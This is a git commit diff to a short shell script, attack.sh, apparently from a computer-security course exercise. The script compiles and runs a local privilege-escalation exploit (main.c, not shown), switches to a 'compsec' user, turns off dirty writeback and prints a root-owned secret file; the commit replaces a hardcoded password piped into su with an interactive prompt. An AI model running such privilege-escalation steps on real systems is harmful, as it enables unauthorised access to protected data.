912caa3860992562d9f3e8f6c0674e38a32465ee
Naftaly Avadiaev <naftaly.avadiaev@gmail.com>
2017-04-11 19:59:49 +0300

    small fix

--- attack.sh
+++ attack.sh
@@ -1,8 +1,15 @@
 #!/bin/bash
 
+echo Escelating privileges please wait...
 gcc main.c -o attack -lpthread
 ./attack
-echo 236653 | su compsec
+sleep 7s
+
+echo "Please enter password for compsec:"
+su compsec
+
+echo "Disabling dirty_writeback..."
 echo 0 > /proc/sys/vm/dirty_writeback_centisec
 
+echo "The secret is:"
 cat /root/secrets/student1/secret
